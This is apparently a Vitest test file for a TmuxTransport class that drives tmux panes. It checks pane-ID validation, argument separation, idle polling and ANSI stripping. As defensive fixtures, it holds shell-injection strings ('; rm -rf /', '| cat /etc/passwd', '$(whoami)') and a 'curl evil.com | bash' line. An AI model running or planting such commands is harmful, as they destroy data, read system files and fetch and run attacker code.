/**
 * Tests for packages/app/src/robotic/transport/TmuxTransport.ts
 *
 * Security and correctness invariants:
 *  - Pane IDs are validated against the strict regex before any tmux call is
 *    made — invalid IDs must throw synchronously from start().
 *  - The 'tmux' binary and pane ID are passed as separate execFile arguments,
 *    never concatenated into a shell string.
 *  - write() uses the -l flag (literal text, no key binding interpretation).
 *  - write() sends text and Enter as two separate execFile calls.
 *  - write() throws when called before start().
 *  - readUntilIdle resolves after the idle window expires with no new output.
 *  - readUntilIdle resolves immediately (returns last output) when tmux exits
 *    nonzero during polling.
 *  - readUntilIdle resolves on hard timeout even if output keeps changing.
 *  - When a tmux socket path is supplied it is forwarded as -S <socket> to
 *    every execFile call.
 *  - ANSI escape sequences are stripped from captured output.
 *  - close() transitions isReady() back to false.
 *
 * Mocking strategy
 * ─────────────────
 * TmuxTransport does `const execFileAsync = promisify(execFile)` at module
 * scope — the promisified wrapper is bound at import time, not call time. To
 * intercept it we must:
 *  1. Use vi.hoisted() so mock state variables are initialised before the
 *     vi.mock factory runs (factories are hoisted to the top of the file by
 *     Vitest's transform pass).
 *  2. Mock node:util so that promisify(fn) returns fn directly — this means
 *     execFileAsync === execFileMock, letting us control every call.
 *  3. Mock node:child_process so that execFile === execFileMock.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

// ─── Hoisted mock state ───────────────────────────────────────────────────────
// vi.hoisted() runs before vi.mock factories, so variables defined here are
// safe to reference inside factory closures.

const { execFileMock } = vi.hoisted(() => ({
  execFileMock: vi.fn(),
}));

// ─── Module mocks ─────────────────────────────────────────────────────────────

vi.mock('node:child_process', () => ({
  execFile: execFileMock,
}));

// promisify(execFile) is called at module scope in TmuxTransport. We make
// promisify return the function it receives unchanged so that execFileAsync
// inside TmuxTransport IS execFileMock and we can resolve/reject it directly.
vi.mock('node:util', async (importOriginal) => {
  const actual = await importOriginal<typeof import('node:util')>();
  return {
    ...actual,
    promisify: (fn: unknown) => fn,
  };
});

// ─── Subject under test ───────────────────────────────────────────────────────

import { TmuxTransport } from '../TmuxTransport.js';

// ─── Helpers ──────────────────────────────────────────────────────────────────

function mockExecFileOk(stdout = ''): void {
  execFileMock.mockResolvedValue({ stdout, stderr: '' });
}

function mockExecFileError(message = 'tmux error'): void {
  execFileMock.mockRejectedValue(new Error(message));
}

/**
 * Build a started TmuxTransport. execFile is pre-configured to succeed for
 * the start() display-message verification call.
 */
async function makeStartedTransport(pane = 'main:0.1', socket?: string): Promise<TmuxTransport> {
  mockExecFileOk('%1');
  const t = new TmuxTransport({ pane, ...(socket !== undefined ? { socket } : {}) });
  await t.start();
  return t;
}

// ─── Pane ID validation ───────────────────────────────────────────────────────

describe('TmuxTransport.start — pane ID validation', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  const validPaneIds: Array<[string, string]> = [
    ['session:window.pane format', 'main:0.1'],
    ['session with digits', 'mysession:2.3'],
    ['session with underscores', 'my_session:0.0'],
    ['session with dots', 'my.session:1.2'],
    ['session with hyphens', 'my-session:0.1'],
    ['bare pane id %0', '%0'],
    ['bare pane id %1', '%1'],
    ['bare pane id %42', '%42'],
  ];

  it.each(validPaneIds)('accepts valid pane id — %s', async (_label, pane) => {
    mockExecFileOk('%1');
    const t = new TmuxTransport({ pane });
    await expect(t.start()).resolves.not.toThrow();
  });

  const invalidPaneIds: Array<[string, string]> = [
    ['empty string', ''],
    ['shell injection semicolon', 'main:0.1; rm -rf /'],
    ['shell injection pipe', 'main:0.1 | cat /etc/passwd'],
    ['shell injection backtick', '`id`'],
    ['shell injection dollar', '$(whoami)'],
    ['shell injection ampersand', 'main:0.1 & evil'],
    ['path traversal', '../other:0.1'],
    ['leading space', ' main:0.1'],
    ['bare pane without percent', '1'],
    ['percent without digits', '%'],
    ['percent with letters', '%abc'],
    ['session:window only (no pane)', 'main:0'],
    ['session only', 'main'],
    ['double colon', 'main::0.1'],
    ['spaces around colon', 'main : 0.1'],
  ];

  it.each(invalidPaneIds)('rejects invalid pane id — %s ("%s")', async (_label, pane) => {
    const t = new TmuxTransport({ pane });
    await expect(t.start()).rejects.toThrow(/invalid tmux pane id/i);
    // Validation must run before any execFile call
    expect(execFileMock).not.toHaveBeenCalled();
  });
});

// ─── start — tmux availability check ─────────────────────────────────────────

describe('TmuxTransport.start — tmux availability', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('resolves and sets isReady() when tmux display-message succeeds', async () => {
    mockExecFileOk('%1');
    const t = new TmuxTransport({ pane: 'main:0.1' });
    await t.start();
    expect(t.isReady()).toBe(true);
  });

  it('throws a descriptive error when tmux is not available / exits nonzero', async () => {
    mockExecFileError('tmux: command not found');
    const t = new TmuxTransport({ pane: 'main:0.1' });
    await expect(t.start()).rejects.toThrow(/not found/i);
    expect(t.isReady()).toBe(false);
  });

  it('calls execFile with "tmux" as the binary (not a shell string)', async () => {
    mockExecFileOk('%1');
    const t = new TmuxTransport({ pane: 'main:0.1' });
    await t.start();
    const [binary] = execFileMock.mock.calls[0] as [string, ...unknown[]];
    expect(binary).toBe('tmux');
  });

  it('passes the pane id as a separate argument, not concatenated into a string', async () => {
    mockExecFileOk('%1');
    const t = new TmuxTransport({ pane: 'main:0.1' });
    await t.start();
    const [, args] = execFileMock.mock.calls[0] as [string, string[]];
    expect(args).toContain('main:0.1');
    // Must not be embedded inside another arg
    const embedded = args.filter((a) => a !== 'main:0.1' && a.includes('main:0.1'));
    expect(embedded).toHaveLength(0);
  });

  it('includes -t flag immediately before the pane id', async () => {
    mockExecFileOk('%1');
    const t = new TmuxTransport({ pane: '%5' });
    await t.start();
    const [, args] = execFileMock.mock.calls[0] as [string, string[]];
    const tIdx = args.indexOf('-t');
    expect(tIdx).toBeGreaterThanOrEqual(0);
    expect(args[tIdx + 1]).toBe('%5');
  });

  it('includes -S <socket> args when a socket path is provided', async () => {
    mockExecFileOk('%1');
    const t = new TmuxTransport({ pane: 'main:0.1', socket: '/tmp/tmux-test.sock' });
    await t.start();
    const [, args] = execFileMock.mock.calls[0] as [string, string[]];
    const sIdx = args.indexOf('-S');
    expect(sIdx).toBeGreaterThanOrEqual(0);
    expect(args[sIdx + 1]).toBe('/tmp/tmux-test.sock');
  });

  it('omits -S args when no socket path is provided', async () => {
    mockExecFileOk('%1');
    const t = new TmuxTransport({ pane: 'main:0.1' });
    await t.start();
    const [, args] = execFileMock.mock.calls[0] as [string, string[]];
    expect(args).not.toContain('-S');
  });
});

// ─── write — pre-condition guard ─────────────────────────────────────────────

describe('TmuxTransport.write — pre-condition guard', () => {
  it('throws when write() is called before start()', async () => {
    const t = new TmuxTransport({ pane: 'main:0.1' });
    await expect(t.write('hello')).rejects.toThrow(/before start/i);
  });
});

// ─── write — argument shape ───────────────────────────────────────────────────

describe('TmuxTransport.write — argument shape', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('makes exactly two execFile calls per write (text then Enter)', async () => {
    const t = await makeStartedTransport();
    vi.clearAllMocks();
    mockExecFileOk();
    await t.write('hello world');
    expect(execFileMock).toHaveBeenCalledTimes(2);
  });

  it('first call uses send-keys with -l flag (literal text, no interpretation)', async () => {
    const t = await makeStartedTransport();
    vi.clearAllMocks();
    mockExecFileOk();
    await t.write('some input');
    const [, firstArgs] = execFileMock.mock.calls[0] as [string, string[]];
    expect(firstArgs).toContain('send-keys');
    expect(firstArgs).toContain('-l');
    expect(firstArgs).toContain('some input');
  });

  it('second call sends the literal string "Enter" without the -l flag', async () => {
    const t = await makeStartedTransport();
    vi.clearAllMocks();
    mockExecFileOk();
    await t.write('some input');
    const [, secondArgs] = execFileMock.mock.calls[1] as [string, string[]];
    expect(secondArgs).toContain('send-keys');
    expect(secondArgs).not.toContain('-l');
    expect(secondArgs).toContain('Enter');
    // The user text must NOT appear in the Enter call
    expect(secondArgs).not.toContain('some input');
  });

  it('passes the pane id to both send-keys calls', async () => {
    const t = await makeStartedTransport('session2:1.3');
    vi.clearAllMocks();
    mockExecFileOk();
    await t.write('hi');
    for (const [, args] of execFileMock.mock.calls as [string, string[]][]) {
      const tIdx = args.indexOf('-t');
      expect(tIdx).toBeGreaterThanOrEqual(0);
      expect(args[tIdx + 1]).toBe('session2:1.3');
    }
  });

  it('includes -S socket args in both send-keys calls when socket is configured', async () => {
    const t = await makeStartedTransport('main:0.1', '/run/tmux.sock');
    vi.clearAllMocks();
    mockExecFileOk();
    await t.write('msg');
    for (const [, args] of execFileMock.mock.calls as [string, string[]][]) {
      const sIdx = args.indexOf('-S');
      expect(sIdx).toBeGreaterThanOrEqual(0);
      expect(args[sIdx + 1]).toBe('/run/tmux.sock');
    }
  });

  it('passes text containing shell metacharacters as a single arg element', async () => {
    const t = await makeStartedTransport();
    vi.clearAllMocks();
    mockExecFileOk();
    const dangerousText = 'echo $(id); rm -rf /tmp/x && curl evil.com | bash';
    await t.write(dangerousText);
    const [, firstArgs] = execFileMock.mock.calls[0] as [string, string[]];
    // The entire string must appear as exactly one element
    expect(firstArgs).toContain(dangerousText);
    // None of the shell tokens should appear as standalone args
    const injectionTokens = ['$(id)', ';', '|', '&&', 'bash'];
    for (const tok of injectionTokens) {
      expect(firstArgs.filter((a) => a === tok)).toHaveLength(0);
    }
  });
});

// ─── readUntilIdle — idle detection ──────────────────────────────────────────

describe('TmuxTransport.readUntilIdle — idle detection', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    vi.useFakeTimers();
  });

  afterEach(() => {
    vi.useRealTimers();
  });

  it('resolves with current output after idleMs of no change', async () => {
    execFileMock.mockResolvedValueOnce({ stdout: '%1', stderr: '' }); // start
    const t = new TmuxTransport({ pane: 'main:0.1' });
    await t.start();
    vi.clearAllMocks();

    const stableOutput = 'prompt $\n';
    execFileMock.mockResolvedValue({ stdout: stableOutput, stderr: '' });

    const promise = t.readUntilIdle({ timeoutMs: 5000, idleMs: 500 });

    // Advance past initial poll interval (200ms) + idleMs (500ms)
    await vi.advanceTimersByTimeAsync(800);

    const result = await promise;
    expect(result).toBe(stableOutput);
  });

  it('resolves with last output on hard timeout when output keeps changing', async () => {
    execFileMock.mockResolvedValueOnce({ stdout: '%1', stderr: '' }); // start
    const t = new TmuxTransport({ pane: 'main:0.1' });
    await t.start();
    vi.clearAllMocks();

    let callCount = 0;
    execFileMock.mockImplementation(async () => {
      callCount += 1;
      return { stdout: `line ${callCount}\n`, stderr: '' };
    });

    const timeoutMs = 1000;
    const promise = t.readUntilIdle({ timeoutMs, idleMs: 99999 });

    await vi.advanceTimersByTimeAsync(timeoutMs + 500);

    const result = await promise;
    expect(typeof result).toBe('string');
    expect(result.length).toBeGreaterThan(0);
  });

  it('resolves immediately when capture-pane throws during polling', async () => {
    execFileMock.mockResolvedValueOnce({ stdout: '%1', stderr: '' }); // start
    execFileMock.mockResolvedValueOnce({ stdout: 'initial output\n', stderr: '' }); // baseline
    execFileMock.mockRejectedValue(new Error('tmux exited'));

    const t = new TmuxTransport({ pane: 'main:0.1' });
    await t.start();

    const promise = t.readUntilIdle({ timeoutMs: 5000, idleMs: 500 });
    await vi.advanceTimersByTimeAsync(300);

    const result = await promise;
    expect(typeof result).toBe('string');
  });

  it('returns empty string when the initial baseline capture throws', async () => {
    execFileMock.mockResolvedValueOnce({ stdout: '%1', stderr: '' }); // start
    execFileMock.mockRejectedValueOnce(new Error('baseline failed'));

    const t = new TmuxTransport({ pane: 'main:0.1' });
    await t.start();

    const result = await t.readUntilIdle({ timeoutMs: 5000, idleMs: 500 });
    expect(result).toBe('');
  });
});

// ─── readUntilIdle — ANSI stripping ──────────────────────────────────────────

describe('TmuxTransport.readUntilIdle — ANSI escape stripping', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    vi.useFakeTimers();
  });

  afterEach(() => {
    vi.useRealTimers();
  });

  it('strips CSI escape sequences from captured output', async () => {
    execFileMock.mockResolvedValueOnce({ stdout: '%1', stderr: '' }); // start
    const ansiOutput = '\x1b[32mGreen text\x1b[0m';
    execFileMock.mockResolvedValue({ stdout: ansiOutput, stderr: '' });

    const t = new TmuxTransport({ pane: 'main:0.1' });
    await t.start();

    const promise = t.readUntilIdle({ timeoutMs: 5000, idleMs: 400 });
    await vi.advanceTimersByTimeAsync(800);

    const result = await promise;
    expect(result).toBe('Green text');
  });

  it('strips OSC sequences from captured output', async () => {
    execFileMock.mockResolvedValueOnce({ stdout: '%1', stderr: '' });
    const oscOutput = '\x1b]0;My Title\x07plain text';
    execFileMock.mockResolvedValue({ stdout: oscOutput, stderr: '' });

    const t = new TmuxTransport({ pane: 'main:0.1' });
    await t.start();

    const promise = t.readUntilIdle({ timeoutMs: 5000, idleMs: 400 });
    await vi.advanceTimersByTimeAsync(800);

    const result = await promise;
    expect(result).toBe('plain text');
  });
});

// ─── close / isReady lifecycle ────────────────────────────────────────────────

describe('TmuxTransport lifecycle', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('isReady() returns false before start()', () => {
    const t = new TmuxTransport({ pane: 'main:0.1' });
    expect(t.isReady()).toBe(false);
  });

  it('isReady() returns true after successful start()', async () => {
    const t = await makeStartedTransport();
    expect(t.isReady()).toBe(true);
  });

  it('isReady() returns false after close()', async () => {
    const t = await makeStartedTransport();
    await t.close();
    expect(t.isReady()).toBe(false);
  });

  it('kind is "tmux"', () => {
    const t = new TmuxTransport({ pane: 'main:0.1' });
    expect(t.kind).toBe('tmux');
  });

  it('events() yields a ready event as its first item', async () => {
    const t = new TmuxTransport({ pane: 'main:0.1' });
    const events = [];
    for await (const ev of t.events()) {
      events.push(ev);
      break;
    }
    expect(events[0]).toEqual({ type: 'ready' });
  });
});
